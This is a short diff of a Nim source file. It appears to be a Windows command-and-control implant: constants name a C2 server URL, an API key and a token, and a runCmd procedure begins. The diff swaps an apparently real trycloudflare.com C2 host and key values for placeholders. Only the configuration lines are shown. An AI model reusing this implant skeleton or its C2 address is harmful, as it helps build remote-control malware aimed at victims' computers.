@@ -2,9 +2,9 @@
 import std/[httpclient, json, os, osproc, strutils, random, net]
 import winim/lean
 
-const C2_URL = "https://charter-max-soldier-wishlist.trycloudflare.com"
-const API_KEY = "c4b248100f153d71aa41ad31895877d0"
-const TOKEN = "4d25c5000d21538b82cbb1054aa917f7"
+const C2_URL = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
+const API_KEY = "00000000000000000000000000000000"
+const TOKEN = "00000000000000000000000000000000"
 
 proc runCmd(cmd: string): string =
   try:
